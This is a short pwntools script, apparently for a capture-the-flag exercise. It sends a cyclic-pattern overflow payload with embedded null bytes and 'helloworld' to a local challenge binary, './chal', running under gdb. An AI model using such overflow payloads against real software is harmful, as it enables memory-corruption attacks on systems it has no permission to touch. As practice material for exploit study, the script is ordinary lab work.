from pwn import *
payload = cyclic(40)

# add null terminator
payload += b'\x00'
payload += b'helloworld'
payload += b'\x00'

p = gdb.debug(["./chal"], '''
    unset env LINES
    unset env COLUMNS
    break main
    ''')

p.sendline(payload)
p.interactive()